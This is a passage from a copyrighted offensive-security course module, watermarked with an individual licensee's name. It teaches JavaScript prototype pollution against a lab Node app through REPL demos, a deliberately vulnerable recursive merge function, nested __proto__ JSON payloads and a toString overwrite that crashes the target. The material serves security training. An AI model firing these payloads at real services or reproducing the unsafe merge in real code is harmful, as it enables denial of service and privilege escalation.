guacd       | [s6-init] making user provided files available at 
/var/run/s6/etc...exited 0. 
... 
guacd       | [services.d] done. 
rdesktop    | [s6-init] making user provided files available at 
/var/run/s6/etc...exited 0. 
.... 
rdesktop    | [services.d] done. 
chips_1     |  
chips_1     | > app@0.0.0 start-dev /usr/src/app 
... 
chips_1     | Starting guacamole-lite websocket server 
Listing 558 - Starting the Chips Server with EJS 
The application was built with comments in the views for all the templating engines. We’ll use 
these comments to differentiate between the templating engines. 
kali@kali:~$ curl http://chips -s | grep "<\!--" 
        <!-- Using EJS as Templating Engine --> 
Listing 559 - Validating Templating Engine 
We are now running Chips using the EJS templating engine. We’ll use this setup for now and 
change engines later on in the module. 
Next, we’ll ensure that remote debugging is working as expected. 
13.1.2.1 Exercises 
1. 
Reconfigure your Chips instance to use EJS instead of the default. 
2. 
Review the three JavaScript files in routes to understand what each one does. 
13.1.3 Configuring Remote Debugging 
A .vscode/launch.json file is provided within the Chips source code, which we can use to quickly 
set up debugging. We will need to update both address fields to point to the remote server. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
489 
{ 
 
    "version": "0.2.0", 
    "configurations": [ 
        { 
            "type": "node", 
            "request": "attach", 
            "name": "Attach to remote", 
            "address": "chips", 
            "port": 9229, 
            "localRoot": "${workspaceFolder}", 
            "remoteRoot": "/usr/src/app" 
        }, 
        { 
            "type": "node", 
            "request": "attach", 
            "name": "Attach to remote (cli)", 
            "address": "chips", 
            "port": 9228, 
            "localRoot": "${workspaceFolder}", 
            "remoteRoot": "/usr/src/app" 
        } 
    ] 
} 
Listing 560 - launch.json 
There are two remote debugging profiles configured. The first is on port 9229. The application is 
already started using the start-dev script from package.json, which will start Node on port 9229. 
To validate that this is working, we need to navigate to the Run and Debug tab in Visual Studio 
Code and start the profile. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
490 
 
Figure 320: Starting Remote Debugging 
When the remote debugging is connected, the Debug Console will show “Starting guacamole-lite 
websocket server” and the bottom bar will turn orange. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
491 
 
Figure 321: Connected to Remote Debugging 
We can disconnect by clicking Disconnect near the top of VS Code. 
 
Figure 322: Disconnecting Remote Debugging 
Next, we will attempt to connect via the CLI. Later in the module, we will use the Node CLI with 
debugging to understand how prototype pollution and templating engines work. 
First, we must start Node.js (with debugging enabled) from the web application container in a 
new terminal window. To do this, we will open a new SSH session to the chips server and use 
docker-compose with the exec command. 
While we can cd into the ~/chips directory and have docker-compose automatically pick up the 
docker-compose.yml file, we can also pass this file in with the -f flag. 
Next, we’ll tell docker-compose we want to execute a command on the chips container (as 
defined in docker-compose.yml). The command we want to execute is 
node 
–
inspect=0.0.0.0:9228 to start an interactive shell but open port 9228 for remote debugging. 
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --
inspect=0.0.0.0:9228 
Debugger listening on ws://0.0.0.0:9228/b38f428b-edfa-42cf-be6a-590bc333a3ad 
For help, see: https://nodejs.org/en/docs/inspector 
Welcome to Node.js v14.16.0. 
Type ".help" for more information. 
>  
Listing 561 - Starting Interactive Shell 
Next, we can select the Attach to remote (cli) setting in Visual Studio Code and start debugging. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
492 
 
Figure 323: Connecting Debugger to Remote CLI 
The bottom bar in the IDE should again turn orange and debugging should begin. We should also 
get a “Debugger attached” message in the interactive node shell. 
The benefit of debugging via the cli is that we can now set breakpoints in individual libraries, load 
them in the interactive cli, and run individual methods without making changes to the web 
application and reloading every time. 
With remote debugging set up, we can begin exploring how JavaScript prototype works and how 
to exploit a prototype pollution vulnerability. 
13.1.3.1 Exercise 
Configure remote debugging via CLI and the web application. 
13.2 Introduction to JavaScript Prototype 
Before we discuss the JavaScript prototype,291 we must first understand that nearly everything in 
JavaScript is an object. This includes arrays, Browser APIs, and functions.292 The only exceptions 
are null, undefined, strings, numbers, booleans, and symbols.293 
Unlike other object-oriented programming languages, JavaScript is not considered a class-based 
language.294 As of the ES2015 standard, JavaScript does support class declarations. However, in 
JavaScript the class keyword is a helper function that makes existing JavaScript implementations 
more familiar to users of class-based programming.295 
 
291 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Object_prototypes 
292 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects 
293 (Salman, 2019), https://blog.bitsrc.io/the-chronicles-of-javascript-objects-2d6b9205cd66 
294 (Elliott, 2016), https://medium.com/javascript-scene/master-the-javascript-interview-what-s-the-difference-between-class-
prototypal-inheritance-e4cd0a7562e9 
295 (Wikipedia, 2021), https://en.wikipedia.org/wiki/ECMAScript#6th_Edition_%E2%80%93_ECMAScript_2015 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
493 
We’ll demonstrate this by creating a class and checking the type. We can use the same 
interactive Node shell we created in the previous section or start a new one. 
student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --
inspect=0.0.0.0:9228 
Debugger listening on ws://0.0.0.0:9228/b38f428b-edfa-42cf-be6a-590bc333a3ad 
For help, see: https://nodejs.org/en/docs/inspector 
Welcome to Node.js v14.16.0. 
Type ".help" for more information. 
> class Student { 
...     constructor() { 
.....     this.id = 1; 
.....     this.enrolled = true 
.....   } 
...     isActive() { 
...             console.log("Checking if active") 
...             return this.enrolled 
...     } 
... } 
undefined 
 
> s = new Student 
Student { id: 1, enrolled: true } 
 
> s.isActive() 
Checking if active 
true 
 
> typeof s 
'object' 
 
> typeof Student 
'function' 
Listing 562 - A class type is actually a “function” 
In Listing 562, we find that the Student class is actually a function. But what does this mean? 
Before ES2015, classes would be created using constructor functions.296  
> function Student() { 
...     this.id = 2; 
...     this.enrolled = false 
... } 
undefined 
>  
 
> Student.prototype.isActive = function() { 
...     console.log("Checking if active") 
...     return this.enrolled; 
... }; 
[Function (anonymous)] 
 
> s = new Student 
 
296 (Schwartz, 2017), https://medium.com/@ericschwartz7/oo-javascript-es6-class-vs-object-prototype-5debfbf8296e 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
494 
Student { id: 2, enrolled: false } 
 
> s.isActive() 
Checking if active 
false 
 
> typeof s 
'object' 
 
> typeof Student 
'function' 
Listing 563 - Pre ES2015 “Class” 
The class keyword in JavaScript is just syntactic sugar for the constructor function. 
Both class and the constructor function use the new keyword to create an object from the class. 
Let’s investigate how this keyword works. 
According to the documentation,297 JavaScript’s new keyword will first create an empty object. 
Within that object, it will set the __proto__ value to the constructor function’s prototype (where we 
set isActive). With __proto__ set, the new keyword ensures that this refers to the context of the 
newly created object. Listing 563 shows that this.id and this.enrolled of the new object are set to 
the respective values. Finally, this is returned (unless the function returns its own object). 
The use of prototype and __proto__ can be confusing for those familiar with other object-oriented 
programming languages like C# and Java. 
Many object-oriented programming languages, such as Java, use a class-based inheritance 
model in which a blueprint (class) is used to instantiate individual objects, which represent an 
item in the real world. The car we own (object in the real world) would inherit from a Car class (the 
blueprint), which contains methods on how to move, brake, turn, etc. 
In this class-based inheritance model, we can run the move() function in the Car object, which 
was inherited from the Car class. However, we cannot run move() directly in the Car class since 
it’s only a blueprint for other classes. We also cannot inherit from multiple classes, like we would 
if we wanted to inherit from a vehicle class and a robot class to create a half-car, half-robot 
Transformer.298 
However, JavaScript uses prototype inheritance, which means that an object inherits properties 
from another object. If we refer back to Listing 562 and Listing 563, Student is a function (don’t 
forget that functions are also objects). When we create an s object, the new keyword inherits from 
the Student object. 
JavaScript benefits from prototype inheritance in many ways. For starters, one object may inherit 
the properties of multiple objects. In addition, the properties inherited from higher-level objects 
can be modified during runtime.299 This could, for example, allow us to create our desired 
Transformer with dynamically changing attack() functions that are modified for each 
Transformer’s unique power. 
 
297 (Mozilla, year), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/new#description 
298 (Hasbro, 2021), https://transformers.hasbro.com/en-us 
299 (Shah, 2013), http://aaditmshah.github.io/why-prototypal-inheritance-matters/#constructors_vs_prototypes 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
495 
The ability to change the inherited properties of a set of objects is a powerful feature for 
developers. However, this power can also be used to exploit an application if improperly handled. 
This inheritance creates a prototype chain, which is best summarized by the MDN Web Docs:300 
When it comes to inheritance, JavaScript only has one construct: objects. Each 
object has a private property which holds a link to another object called its 
prototype. That prototype object has a prototype of its own, and so on until an 
object is reached with null as its prototype. By definition, null has no prototype, 
and acts as the final link in this prototype chain. 
It’s important to note that __proto__ is part of the prototype chain, but prototype is not.301 
Remember, the new keyword sets __proto__ to the constructor function prototype. 
Earlier, we set the isActive prototype of Student to a function that logs a message to the console 
and returns the status of the Student. It should not come as a surprise that we can call the 
isActive function directly from the “class”. 
> Student.prototype.isActive() 
Checking if active 
undefined 
Listing 564 - Running isActive From “class” 
As expected, the function executed, logged to the console, and returned “undefined” since enrolled 
is not set in the prototype instance. However, if we try to access isActive within the Student 
function constructor instead of the prototype, the function is not found. 
> Student.isActive 
undefined 
Listing 565 - isActive is not Defined in the Function Constructor 
This is because prototype is not part of the prototype chain but __proto__ is. When we run isActive 
on the s object, we are actually running the function within s.__proto__.isActive() (with this context 
properly bound to the values in the object). We can validate this by creating a new isActive 
function directly in the s object instead of running the one in __proto__. We can then delete the 
new isActive function and observe that the prototype chain resolves the old isActive function from 
__proto__. 
> s.isActive() 
Checking if active 
false 
 
> s.isActive = function(){ 
... console.log("New isActive"); 
... return true; 
... } 
[Function (anonymous)] 
 
> s.isActive() 
New isActive 
 
300 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain 
301 (Kahn, 2021), https://stackoverflow.com/a/9959753 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
496 
true 
 
> s.__proto__.isActive() 
Checking if active 
undefined 
 
> delete s.isActive 
true 
 
> s.isActive() 
Checking if active 
false 
Listing 566 - Demo of the prototype Chain in Action 
When we set isActive on the s object directly, __proto__.isActive was not executed. 
One interesting component of this chain is that when Student.prototype.isActive is modified, so is 
s.__proto__.isActive. 
> Student.prototype.isActive = function () { 
... console.log("Updated isActive in Student"); 
... return this.enrolled; 
... } 
[Function (anonymous)] 
 
> s.isActive() 
Updated isActive in Student 
false 
Listing 567 - Prototype link to Student 
When we called the s.isActive() function, the updated function was executed because the isActive 
function is a link from the __proto__ object to the prototype of Student. 
If we poke around the s object further, we find there are other functions that are available that we 
did not set, like toString. 
> s.toString() 
'[object Object]' 
Listing 568 - toString of Object 
The toString function returns a string representation of the object. This toString function is a built-
in function in the prototype of the Object class.302 
Note that Object (capital “O”) refers to the Object data-type class. s is an object that inherits 
properties from the Student class. The Student class inherits properties from the Object class 
(since almost everything in JavaScript is an Object). 
> o = new Object() 
{} 
 
> o.toString() 
'[object Object]' 
 
302 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
497 
 
> {}.toString() 
'[object Object]' 
Listing 569 - toString in Object 
We can add a new toString to be something a bit more usable in our object by setting toString in 
the prototype of the Student constructor function. 
> s.toString() 
'[object Object]' 
 
> Student.prototype.toString = function () { 
... console.log("in Student prototype"); 
... return this.id.toString(); 
... } 
[Function (anonymous)] 
 
> s.toString() 
in Student prototype 
'2' 
Listing 570 - Updated toString 
The toString function now returns the id of the Student as a string. 
As we demonstrated earlier, we can also add toString directly to the s object. 
> s.toString = function () { 
... console.log("in s object"); 
... return this.id.toString(); 
... } 
[Function (anonymous)] 
 
> s.toString() 
in s object 
'2' 
Listing 571 - toString in s object 
At this point, this object has three toString functions in its prototype chain. The first is the Object 
class prototype, the second is in the Student prototype, and the last is in the s object directly. The 
prototype chain will select the one that comes up first in the search, which in this case is the 
function in the s object. If we create a new object from the Student constructor, which toString 
method will be the default when called? 
> s2 = new Student() 
Student { id: 2, enrolled: false } 
 
> s2.toString() 
in Student prototype 
'2' 
Listing 572 - toString in New Object 
The new Student object uses the toString method within the Student prototype. 
What would happen if we changed the toString function in the Object class prototype? 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
498 
> Object.prototype.toString = function () { 
... console.log("in Object prototype") 
... return this.id.toString(); 
... } 
[Function (anonymous)] 
 
> delete s.toString 
true 
 
> delete Student.prototype.toString 
true 
 
> s.toString() 
in Object prototype 
'2' 
Listing 573 - toString in Object Class 
In Listing 573, we set the toString to log a message and return the id. We also deleted the other 
toString functions in the chain to ensure we execute the one in Object. When we run s.toString(), 
we find that we are indeed running the toString function in the Object prototype. 
Remember earlier when we found that even new Objects get the updated prototype when 
changed in the constructor, and that almost everything in JavaScript is made with Objects? Well, 
let’s check out the toString function of a blank object now. 
> {}.toString() 
in Object prototype 
Uncaught TypeError: Cannot read property 'toString' of undefined 
    at Object.toString (repl:3:16) 
Listing 574 - toString of Blank object after prototype update 
Since the blank object does not have an id, we receive an error. However, because of this error 
and the “in Object prototype” message, we know that we are executing the custom function we 
created in the Object prototype. 
At this point, we have polluted the prototype of nearly every object in JavaScript and changed the 
toString function every time it is executed. 
These changes to the toString function only affect the current interpreter process. However, they 
will continue to affect the process until it is restarted. In order to wipe this change, we must exit 
the Node interactive CLI and start a new interactive session. 
Similarly, Node web applications are affected in the same way. Once the prototype is polluted, it 
will stay that way until the application is rebooted or crashes, which causes a reboot. 
Next, let’s discuss how we can use prototype pollution to our advantage. 
13.2.1.1 Exercise 
1. 
Explain the following: 
> Object.toString() 
'function Object() { [native code] }' 
 
> (new Object).toString() 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
499 
'[object Object]' 
 
> (new Function).toString() 
'function anonymous(\n) {\n\n}' 
 
> {}.__proto__.toString = "breaking toString" 
'breaking toString' 
 
> (new Object).toString() 
Uncaught TypeError: (intermediate value).toString is not a function 
 
> (new Function).toString() 
'function anonymous(\n) {\n\n}' 
Listing 575 - Function toString is not broken 
As Listing 575 shows, when the toString is overwritten in the Object prototype, the toString 
function is not overwritten. Why is that? 
13.2.2 Prototype Pollution 
Prototype pollution was not always considered a security issue. In fact, it was used as a feature to 
extend JavaScript in third-party libraries.303 For example, a library could add a “first” function to all 
arrays(),304 “toISOString” to all Dates, 305 and “toHTML” to all objects.306 
However, this caused issues with future-proofing code since any native implementations that 
came out later would be replaced by the less efficient third-party API. Even so, this by itself is not 
a security issue.307 
However, if an application accepts user input and allows us to inject into the prototype of Object, 
this creates a security issue. 
While there are many situations that might cause this, it often occurs in extend or merge type 
functions. These functions merge objects together to create a new merged or extended object. 
For example, consider the following code: 
const { isObject } = require("util");    
 
function merge(a,b) { 
    for (var key in b){ 
        if (isObject(a[key]) && isObject(b[key])) { 
            merge(a[key], b[key]) 
        }else { 
            a[key] = b[key]; 
        } 
    } 
 
303 (Prototype Core Team., 2015), http://prototypejs.org/learn/extensions 
304 (Prototype Core Team., 2015), https://github.com/prototypejs/prototype/blob/5fddd3e/src/prototype/lang/array.js#L222 
305 (Prototype Core Team., 2015), https://github.com/prototypejs/prototype/blob/5fddd3e/src/prototype/lang/date.js#L24 
306 (Prototype Core Team., 2015), 
https://github.com/prototypejs/prototype/blob/5fddd3ef8c93d8419fb45b7f8c6fddeb9f591150/src/prototype/lang/object.js#L301 
307 (Croll, 2011), https://javascriptweblog.wordpress.com/2011/12/05/extending-javascript-natives/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
500 
    return a 
} 
Listing 576 - Merge Function 
The merge function above accepts two objects. It iterates through each key in the second object. 
If the value of the key in the first and second object are also objects, the function will recursively 
call itself and pass in the two objects. If these are not objects, the value of the key in the first 
object will be set to the value of the key in the second object using computed property names.308 
Using this method, we can merge two objects: 
> const { isObject } = require("util"); 
undefined 
> function merge(a,b) { 
...     for (var key in b){ 
.....       if (isObject(a[key]) && isObject(b[key])) { 
.......             merge(a[key], b[key]) 
.......         }else { 
.......             a[key] = b[key]; 
.......         } 
.....   } 
...     return a 
... } 
undefined 
 
> x = {"hello": "world"} 
{ hello: 'world' } 
 
> y = {"foo" :{"bar": "foobar"}} 
{ foo: { bar: 'foobar' } } 
 
> merge(x,y) 
{ hello: 'world', foo: { bar: 'foobar' } } 
Listing 577 - Merging 2 objects 
This gets interesting when we set the “__proto__” key in the second object to another object. 
> x = {"hello": "world"} 
{ hello: 'world' } 
 
> y = {["__proto__"] :{"bar": "foobar"}} 
{ __proto__: { bar: 'foobar' } } 
 
> merge(x,y) 
{ hello: 'world' } 
Listing 578 - Merge With proto 
 
308 (Mozilla, 2021), https://developer.mozilla.org/en-
US/docs/Web/JavaScript/Reference/Operators/Object_initializer#computed_property_names 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
501 
13.2.2.1.1 
 
The square brackets around “__proto__” will ensure that __proto__ will be 
enumerable. Setting the value this way sets isProtoSetter to false, making the 
object enumerable by the for loop in the merge function.309 
When the merge function runs, it will iterate through all the keys in the y object. The only key in 
this object is “__proto__”. 
Since x[“__proto__”] will always be an object (remember, it’s a link to the prototype of the parent 
object) and y[“__proto__”] will be an object (since we set it to one), the if statement will be true. 
This means that the merge function will be called using x[“__proto__”] and y[“__proto__”] as 
arguments. 
When the merge function runs again, the for loop will enumerate the keys of y[“__proto__”]. The 
only attribute of y[“__proto__”] is “bar”. Since this attribute does not exist in x[“__proto__”], the if 
statement will be false and the else branch will be executed. The else branch will set the value of 
x[“__proto__”][“foo”] to the value of y[“__proto__”][“foo”] (or “foobar”). 
However, since x[“__proto__”] is pointing to the Object class prototype, then all objects will be 
polluted due to the merge. We can witness this by checking the value of bar in newly created 
objects. 
> {}.bar 
'foobar' 
Listing 579 - “bar” Attribute of New Object 
Clearly, this can become dangerous if, for example, we begin adding attributes like “isAdmin” to all 
objects. If the application is coded in a particular way, all users suddenly become administrators. 
Even if __proto__ of one object is the prototype of a user-defined class (like in our Student example 
earlier), we can chain multiple “__proto__” keys until we reach the Object class prototype: 
> delete {}.__proto__.bar 
true 
 
> function Student() { 
... this.id = 2; 
... this.enrolled = false 
... } 
undefined 
 
> s = new Student 
Student { id: 2, enrolled: false } 
 
> s2 = new Student 
Student { id: 2, enrolled: false } 
 
> x = {"foo": "bar"} 
{ foo: 'bar' } 
 
309 (CertainPerformance, 2021), https://stackoverflow.com/a/66556134 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
502 
 
> merge(s,x) 
Student { id: 2, enrolled: false, foo: 'bar' } 
 
> x = {["__proto__"]: { "foo": "bar" }} 
{ __proto__: { foo: 'bar' } } 
 
> merge(s,x) 
Student { id: 2, enrolled: false, foo: 'bar' } 
 
> {}.foo 
undefined 
 
> s.foo 
'bar' 
 
> s2.foo 
'bar' 
Listing 580 - Setting Object Prototype in User Defined Class Unsuccessfully 
In this case, when we set the “__proto__” object only one level deep, we are actually only 
interacting with the prototype of the Student class. As a result, both s and s2 have the value of foo 
set to “bar”. 
> x = {["__proto__"]: { ["__proto__"]: {"foo": "bar" }}} 
{ __proto__: { __proto__: { foo: 'bar' } } } 
 
> merge(s,x) 
Student { id: 2, enrolled: false, foo: 'bar' } 
 
> {}.foo 
'bar' 
Listing 581 - Setting Object Prototype in User Defined Class Successfully 
However, when we set the “__proto__” object multiple levels deep, we find that we begin 
interacting higher up in the prototype chain. At that point, all objects start to have the value of foo 
set to “bar”. 
It’s important to note that for a merge function to be vulnerable (and functional), it must 
recursively call itself when the value of the keys are both objects. For example, the following code 
is not vulnerable and does not properly merge two objects: 
function badMerge (a,b) { 
  for (var key in b) { 
    a[key] = b[key];  
  } 
  return a 
} 
Listing 582 - Non-vulnerable Merge 
A function like this does not work as a true merge function since it does not recursively merge 
objects. 
> delete {}.__proto__.foo 
true 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
503 
 
> function badMerge (a,b) { 
...   for (var key in b) { 
.....     a[key] = b[key];  
.....   } 
...   return a 
... } 
undefined 
 
> x = {"foo": {"bar": "foobar" }} 
{ foo: { bar: 'foobar' } } 
 
> y = {"foo": {"hello": "world" }} 
{ foo: { hello: 'world' } } 
 
> merge(x,y) 
{ foo: { bar: 'foobar', hello: 'world' } } 
 
> x = {"foo": {"bar": "foobar" }} 
{ foo: { bar: 'foobar' } } 
 
> y = {"foo": {"hello": "world" }} 
{ foo: { hello: 'world' } } 
 
> badMerge(x,y) 
{ foo: { hello: 'world' } } 
Listing 583 - Using BadMerge 
Since badMerge does not recursively call itself on objects to merge individual objects, the 
individual keys in an object are not merged. Because of this, a function like badMerge would not 
be vulnerable to prototype pollution. 
There are a few more minor details about prototype pollution that we should consider before 
moving on. For example, variables polluted into the prototype are enumerable in for…in 
statements.310 
> x = {"hello": "world"} 
{ hello: 'world' } 
 
> y = {["__proto__"] :{"bar": "foobar"}} 
{ __proto__: { bar: 'foobar' } } 
 
> merge(x,y) 
{ hello: 'world' } 
 
> for (var key in {}) console.log(key) 
bar 
Listing 584 - Using for Loop to Enumerate Polluted Object 
The polluted variables are also enumerable in arrays. 
 
310 (Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...in 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
504 
> for (var i in [1,2]) console.log(i) 
0 
1 
bar 
Listing 585 - Using for Loop to Enumerate Polluted Array 
This occurs because for…in statements will iterate over all the enumerable properties. However, 
the variable in the prototype does not increase the array length. Because of this, if a loop uses the 
array length, the polluted variables are not enumerated. 
> for (i = 0; i< [1,2].length; i++) console.log([1,2][i]) 
1 
2 
undefined 
Listing 586 - Using forEach to Enumerate Polluted Array 
This is also true of the forEach loop since ECMAscript specifies that forEach use the length of the 
array.311 
> [1,2].forEach(i => console.log(i)) 
1 
2 
Listing 587 - Using forEach to Enumerate Polluted Array 
Now that we know how to use JavaScript’s prototype and how to pollute with it, let’s investigate 
how to discover it using blackbox and whitebox techniques. 
13.2.3 Blackbox Discovery 
As with many blackbox exploitation techniques, we’ll be operating blindly when searching for 
prototype pollution. False negatives will be common, but we can leverage a simple methodology. 
However, we must warn that these techniques are abrasive and might lead to denial of service of 
the target application. Unlike reflected XSS, prototype pollution will continue affecting the target 
application until it is restarted. 
Up to this point, we have been using JavaScript objects to demonstrate the power of prototype 
pollution. However, we usually cannot pass direct JavaScript objects within HTTP requests. 
Instead, the requests would need to contain some kind of serialized data, such as JSON. 
In these situations, when a vulnerable merge function is executed, the data is first parsed from a 
JSON object into a JavaScript object. More commonly, libraries will include middleware that will 
automatically parse an HTTP request body, with “application/json” content type, as JSON.312 
Not all prototype pollution vulnerabilities come from the ability to inject 
“__proto__” into a JSON object. Some may split a string with a period character 
(“file.name”), loop over the properties, and set the value to the contents.313 In 
 
311 (Ecma International, 2021), https://tc39.es/ecma262/#sec-array.prototype.foreach 
312 (Express, 2017), http://expressjs.com/en/4x/api.html#express.json 
313 (posix, 2020), https://blog.p6.is/Real-World-JS-1/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
505 
these situations, other payloads like “constructor.prototype” would work instead 
of “__proto__”. These types of vulnerabilities are more difficult to discover using 
blackbox techniques. 
To discover a prototype pollution vulnerability, we can replace one of the commonly used 
functions in the Object prototype in order to get the application to crash. For example, toString is a 
good target since many libraries use it and if a string is provided instead of a function, the 
application would crash. 
We might need to continue using the application beyond the initial pollution to understand how 
the exploit impacts it. The initial request might start the prototype pollution, but it requires 
subsequent requests to realize the impact. 
Many applications in production will run with the application started as a daemon and restart 
automatically if the application crashes.314 In these situations, the application might hang until the 
restart is complete, it might return a 500, or it might return a 200 with incomplete output. In these 
scenarios, we need to search for anything that is out of the ordinary. 
Earlier, we discovered our target application accepts JSON on input in POST requests to the 
/token endpoint. Let’s try to understand what happens if we try to replace the toString function 
with a string. 
First, let’s capture a POST request to /token in Burp and send it to Repeater. 
 
314 (PM2, 2021), https://pm2.keymetrics.io/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
506 
 
Figure 324: Token Request in Repeater 
Next, let’s add a payload that will replace the toString function with a string in the object prototype 
(if it’s vulnerable). We’ll add this at end of the JSON after the connection object and send the 
request. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
507 
 
Figure 325: Adding Payload After Connection Object 
As we noticed earlier when we were exploring the application, the token in the response is 
encrypted and used for subsequent requests. To ensure that this payload propagates, let’s use 
this token in the /rdp endpoint, as intended. 
Navigating to the page in a browser loads the RDP endpoint as if nothing is wrong. If we reload 
the page, the application still works. It seems as if this request did not pollute the prototype. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
508 
 
Figure 326: Loading Page with No Crash 
This might seem disappointing, but we shouldn’t give up just yet. If the application is running the 
payload through a vulnerable merge function, it is possible that only some objects are merged. 
Let’s examine the original JSON in the payload. 
{ 
    "connection": { 
        "type": "rdp", 
        "settings": { 
            "hostname": "rdesktop", 
            "username": "abc", 
            "password": "abc", 
            "port": "3389", 
            "security": "any", 
            "ignore-cert": "true", 
            "client-name": "", 
            "console": "false", 
            "initial-program": "" 
        } 
    } 
} 
Listing 588 - Original JSON payload 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
509 
The connection object has two keys: type and settings. An object like settings is popular for 
merging because the developer may have a set of defaults that they wish to use but extend those 
defaults with user-provided settings. 
This time, let’s attempt to set the payload in the settings object instead of the connection object 
and send the request. 
 
Figure 327: Adding Payload to Settings Object 
Again, we will use the token in the response in the /rdp endpoint. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
510 
 
Figure 328: Application Crashes 
This time, the application responds, but the RDP connection does not load. In addition, refreshing 
the page shows that the application is no longer running. 
As before, the only way to recover is to restart Node. In a true blackbox assessment, we would 
not have access to restart the application. However, to understand the vulnerability more, let’s 
investigate the last lines of the docker-compose output before the application crashed. 
We can obtain the logs of the application at any point by running docker-compose -f 
~/chips/docker-compose.yml logs chips in an ssh session. 
/usr/src/app/node_modules/<span custom-style="BoldCodeRed">moment/moment.js:28 
            Object.prototype.toString.call(input) === '[object Array]' 
                                      ^ 
 
TypeError: Object.prototype.toString.call is not a function 
    at isArray (/usr/src/app/node_modules/moment/moment.js:28:39) 
    at createLocalOrUTC (/usr/src/app/node_modules/moment/moment.js:3008:14) 
    at createLocal (/usr/src/app/node_modules/moment/moment.js:3025:16) 
    at hooks (/usr/src/app/node_modules/moment/moment.js:16:29) 
    at ClientConnection.getLogPrefix (/usr/src/app/node_modules/guacamole-
lite/lib/ClientConnection.js:82:22) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
511 
    at ClientConnection.log (/usr/src/app/node_modules/guacamole-
lite/lib/ClientConnection.js:78:22) 
    at /usr/src/app/node_modules/guacamole-lite/lib/ClientConnection.js:44:18 
    at Object.processConnectionSettings (/usr/src/app/node_modules/guacamole-
lite/lib/Server.js:117:64) 
    at new ClientConnection (/usr/src/app/node_modules/guacamole-
lite/lib/ClientConnection.js:37:26) 
    at Server.newConnection (/usr/src/app/node_modules/guacamole-
lite/lib/Server.js:149:59) 
Listing 589 - Strack Trace of Crash 
The moment library attempted to run toString. When it did, the application crashed with an 
“Object.prototype.toString.call is not a function” error. 
Let’s restart the application and use a whitebox approach to understand why this error occurred 
and where exactly the prototype pollution exists. 
13.2.3.1 Exercise 
Pollute the Object prototype by setting toString to a string and observe the application crash. 
13.2.4 Whitebox Discovery 
While a prototype pollution vulnerability may exist inside the main application, it is unlikely. Many 
libraries provide merge and extend functionality so that the developers do not have to create their 
own function. Nevertheless, it’s important to check. 
We can search for computed property names that accept a variable to reference a key in an 
object (as we discovered in the merge function). To do this, we would search for square brackets 
